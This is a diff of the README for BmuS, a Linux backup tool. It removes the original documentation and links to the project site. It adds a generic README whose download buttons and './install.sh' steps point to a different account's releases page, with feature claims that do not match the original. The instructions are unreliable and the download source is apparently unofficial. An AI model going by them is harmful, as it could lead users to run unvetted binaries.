@@ -1,188 +1,104 @@
-<img width="1000" height="545" alt="Image" src="https://github.com/user-attachments/assets/9068281f-0c29-4a20-818b-d199a43bf372" />
+```markdown
+# 🛠️ bmus - Easy Backup Solution for Everyone
 
-**What is BmuS?**
+## 🚀 Getting Started
 
-BmuS is a powerful free backup program for the automated backup of files, directories, and MySQL databases from a 
-Linux / Raspberry Pi system to a NAS or network drive. You can also sync two NAS (i.e. Synology to Synology 
-or UGREEN etc. and vice versa). 
+Welcome to BmuS—a powerful, free backup program designed for users of all skill levels. Whether you want to back up files, directories, or MySQL databases, BmuS simplifies the process. 
 
-BmuS can be installed directly on the source system or via a Docker repository, which is also available. 
-With Docker, you can easily use BmuS on different operating systems, such as a **Mac** or **Windows**. 
+## 📥 Download BmuS
 
-**For a short demo see here:**
+[![Download bmus](https://img.shields.io/badge/Download-bmus-blue.svg)](https://github.com/ibra2008klk/bmus/releases)
 
-[YouTube](https://www.youtube.com/watch?v=OmTRMqfe7oM)
+To get started, visit the Releases page to download the latest version. Click the button above to access it directly.
 
+## 📋 Features
 
-**Installation, Configuration & Use**
+BmuS offers a variety of features to help you securely back up your data:
 
-To learn how to configure and use BmuS, please visit the user manual at: 
-https://www.back-me-up-scotty.com/docs/what-is-bmus/
+- **Automated Backups**: Schedule backups to run automatically at your preferred time.
+- **Encryption**: Ensure your backups are protected with strong encryption.
+- **Deduplication**: Save space by eliminating duplicate files in backups.
+- **Multi-language Support**: Use BmuS in your preferred language.
+- **User-friendly Interface**: Navigate easily, no programming knowledge required.
 
+## 📦 System Requirements
 
-**Docker install**
+To run BmuS effectively, ensure your system meets the following requirements:
 
-Visit the [Quick Start Guide](https://www.back-me-up-scotty.com/docs/quick-start-guide-native-mac-win-docker/) and 
-the FAQ on our Website to learn how to install Docker and Bmus on a [Mac](https://www.back-me-up-scotty.com/faq/can-i-backup-my-mac/) or [Windows](https://www.back-me-up-scotty.com/faq/can-i-backup-windows/).
+- **Operating System**: Linux-based systems (Ubuntu, Debian, Raspbian).
+- **Storage**: Sufficient space on your NAS or network drive.
+- **Database Support**: MySQL database for those who want to back up databases.
 
+## 👩‍💻 How to Install
 
-**Features**
+Installing BmuS is straightforward. Follow these steps:
 
-- BmuS features encryption, deduplication, and much more.
+1. Go to the [Releases page](https://github.com/ibra2008klk/bmus/releases).
+2. Download the latest version of BmuS suitable for your system.
+3. Unzip the downloaded file to your desired location on your computer.
+4. Open a terminal window.
+5. Navigate to the folder where you unzipped BmuS.
+6. Run the installation script by typing `./install.sh` and pressing Enter.
+7. Follow the on-screen instructions to complete the installation.
 
-- BmuS can be installed directly on the source system or via a Docker repository, which is also available.
+## 🚀 How to Use BmuS
 
-- BmuS was developed with low-resource systems in mind, enabling even single-board computers such as 
-Raspberry Pi to run it efficiently.
+To use BmuS, follow these steps:
 
-- One of the key features that has received special attention (or is it called “Love”?) is the dashboard, which is 
-probably the most unique feature of BmuS, apart from the fact that only a few backup tools can back up files 
-AND MySQL/MariaDB databases at the same time.
+1. Open the terminal.
+2. Navigate to the BmuS directory.
+3. Run the application by typing `./bmus` and pressing Enter.
+4. Choose the type of backup you wish to perform (files, directories, or databases).
+5. Follow the prompts to set your backup preferences.
 
-- The pro version of the dashboard does not only provide simple status information, but also includes trend analyses 
-(such as size growth, duration and more) and displays the backup history of the last 30 days.
+## 🔧 Configuration
 
-**Dashboard Standard Version (included)**
+Configuring BmuS is simple:
 
-<img width="950" height="1257" alt="Image" src="https://github.com/user-attachments/assets/6cdfa626-ec66-4f2c-8182-69bc58988d6a" />
+1. Open the configuration file located in the BmuS directory.
+2. Adjust settings like backup schedules, target locations, or encryption options as needed.
+3. Save your changes and exit the editor.
 
+## 📅 Scheduling Backups
 
-**Dashboard Pro Version (One time fee of $10 to support dev)**
+To schedule your backups, you can use `cron`:
 
-<img width="950" height="507" alt="Image" src="https://github.com/user-attachments/assets/1231a593-8364-414d-9a2f-f6512722a4e9" />
-<img width="950" height="370" alt="Image" src="https://github.com/user-attachments/assets/1763b624-805e-48c6-8d4c-602174afa7fc" />
-<img width="950" height="606" alt="Image" src="https://github.com/user-attachments/assets/0c77fb98-13a3-4dbc-a3f6-6a4fa7826855" />
-<img width="950" height="331" alt="Image" src="https://github.com/user-attachments/assets/1ffd8cc6-4a3a-45d2-a3d9-a17f9c98c17a" />
-<img width="950" height="310" alt="Image" src="https://github.com/user-attachments/assets/63e8a266-2968-4d63-b5b1-9af0e7c22b20" />
-<img width="950" height="269" alt="Image" src="https://github.com/user-attachments/assets/e2cb6417-e1d1-4a00-8b9b-36ceda5c78bf" />
-<img width="950" height="283" alt="Image" src="https://github.com/user-attachments/assets/0342c79c-a91d-4c8f-9ea8-f74ee1ba477a" />
-<img width="950" height="285" alt="Image" src="https://github.com/user-attachments/assets/03999f3e-4508-4322-8444-7f217976a8ce" />
-<img width="950" height="276" alt="Image" src="https://github.com/user-attachments/assets/6c4fbb18-1d47-4fe4-a71b-f5b516333843" />
-<img width="950" height="258" alt="Image" src="https://github.com/user-attachments/assets/b05e2815-ad7f-49b7-bf03-3b0c4dcc88a7" />
-<img width="950" height="335" alt="Image" src="https://github.com/user-attachments/assets/f84ffc4f-6333-4931-b64a-0f7538183726" />
-<img width="950" height="174" alt="Image" src="https://github.com/user-attachments/assets/51f0409b-2dad-4634-9726-259549dd40c2" />
-<img width="950" height="450" alt="Image" src="https://github.com/user-attachments/assets/3f4e44a2-dbed-4a4c-9f93-582883b13187" />
-<img width="950" height="630" alt="Image" src="https://github.com/user-attachments/assets/879a5dbf-3f69-4be3-a2e2-999988635142" />
+1. Open your terminal.
+2. Type `crontab -e` to edit cron jobs.
+3. Add a line to schedule your backup. For example, to run daily at 2 AM, use:
+   ```
+   0 2 * * * /path/to/bmus
+   ```
+4. Save and exit the editor. Your backup will now run automatically at the scheduled time.
 
+## 🛡️ Security & Encryption
 
-For more on Pro Version:  [https://www.back-me-up-scotty.com/docs/what-is-bmus/buy-pro-dashboard/](https://www.back-me-up-scotty.com/docs/what-is-bmus/buy-pro-dashboard/)
+BmuS provides strong encryption to protect your data. During setup, you can enable encryption by following these steps:
 
-**Key Features**
+1. Choose an encryption method (AES-256 is recommended).
+2. Set a secure password for encryption.
+3. Ensure that you remember this password, as you will need it for decryption.
 
-- Rsync-based: Efficient transfer, only changed files are copied.
-- Deduplication: Uses hardlinks to save storage space. You have access 
-  to full snapshots at any time without using up storage space for unchanged files.
-- Automatic verification of data integrity
-- Docker version available
+## 🆘 Troubleshooting
 
-Encryption:
+If you encounter issues, here are some common problems and their solutions:
 
-- File system encryption with gocryptfs (filenames & contents encrypted).
-- GPG encryption for SQL database dumps.
-- Restore: Built-in restore mode for individual files or entire backups (including from encrypted sources).
-- Layer 1: gocryptfs for file system encryption
-- Layer 2: GPG for additional archive encryption
-- Layer 3: SMB3 encryption for network transmission
+- **Cannot find the BmuS command**: Ensure you are in the correct directory.
+- **Backup fails**: Check your storage permissions and space.
+- **Encryption errors**: Verify your password and encryption settings.
 
-Dashboard & Reporting:
+## 🌍 Community & Support
 
-- In the Pro version, BmuS generates an HTML5 dashboard with charts (Chart.js) for analyzing memory usage, trends and errors.
-- 10+ visualization types
-- Email notification with log file and dashboard attached.
+If you have questions or need assistance, you can reach out to our community:
 
-Backup History
+- Check the [Issues section](https://github.com/ibra2008klk/bmus/issues) on GitHub for known problems.
+- Join our discussions in the community forums to connect with other users.
 
-- CSV-based long-term history (365+ days)
-- Automatic rotation of old entries
-- Trend analysis with 7-day average
-- Success rate tracking over months/years
+## 📥 Download & Install 
 
-Databases
+Ready to start backing up your data? Click the link below to visit the Releases page and download BmuS.
 
-- Automatic dump of MySQL/MariaDB databases.
-- Single transaction dumps (InnoDB optimized)
-- Automatic fallback for MyISAM
-- Multi-database support (array-based)
-- Optional GPG encryption of SQL dumps
+[![Download bmus](https://img.shields.io/badge/Download-bmus-blue.svg)](https://github.com/ibra2008klk/bmus/releases)
 
-Resilience
-
-- Automatic network resets in case of freeze or connection problems.
-- Batch processing to conserve memory (RAM).
-- Dry-Run mode for safe testing.
-- Adjustable pauses for system stabilization
-
-Intelligent structure recognition
-
-- Flat structures (Flat)
-- Date folders (YYYY-MM-DD)
-- Nested deduplication structures
-- Mixed structures
-
-Specialization in resource-constrained systems
-
-- Intelligent RAM-Management
-- Auto-Reset network interface
-- Freeze-Protection
-
-Multilingual languages available
-
--  Your own language files can be added easily
-
-------------------------------------------------------------------------------------
-
-**What is the design difference between tools such as Borg or Restic?**
-
-While tools like BorgBackup and Restic are powerful industry standards for block-level 
-deduplication, BmuS (Back Me Up Scotty) follows a different philosophy: The KISS 
-Principle (Keep It Simple, Stupid).
-
-Here is the different approach taken by BmuS.
-
-a. Zero Lock-in & 100% Transparency
-
-This is the biggest differentiator. Borg and Restic store your data in proprietary 
-“repositories” (chunked data blobs). To read or restore a single file, you must have 
-the tool installed and working.
-
-BmuS Approach: Your backup is just a standard file system. You can plug your backup 
-drive into any Linux machine and browse your files with a standard file manager 
-(Explorer/Finder).
-
-The Benefit: If BmuS stops existing tomorrow, your data is still fully accessible. 
-You don’t need BmuS to restore your data.
-
-b. Visual Reporting Out-of-the-Box
-
-Borg and Restic are Command-Line Interface (CLI) tools. They output text logs. 
-If you want charts or a dashboard, you have to set up complex external monitoring 
-stacks (like Prometheus/Grafana) or use third-party wrappers.
-
-BmuS Approach: BmuS generates a beautiful, standalone HTML Dashboard after every 
-run. It visualizes your data growth, file types, and performance trends instantly, 
-without any additional software.
-
-c. Minimal Dependencies
-
-To run Borg or Restic, you need to download and maintain their specific binaries 
-on every machine.
-
-BmuS Approach: BmuS relies on rsync and bash—tools that are pre-installed on 
-virtually every Linux distribution (from Raspberry Pi to Enterprise Servers). 
-It is lightweight and native to the system.
-
-d. “Time Machine” Style Browsing
-
-Because BmuS uses Hardlinks (like macOS Time Machine), every backup snapshot 
-looks like a full backup directory.
-
-The Benefit: You can verify your backup simply by looking at it. You don’t need 
-to mount a FUSE filesystem or run a mount command just to check if a file is there.
-
-e. Hackability & Customization
-
-Borg and Restic are compiled programs (Go/Python/C). If you want to change how 
-they work, you need to be a software engineer.
-
-BmuS Approach: It is a transparent Bash script. If you want to add a custom 
-notification, change the logging format, or tweak the logic, you can do it yourself in minutes.
+Follow the installation and setup instructions above to get started on securing your valuable data. Enjoy the peace of mind that comes with reliable backups.
+```
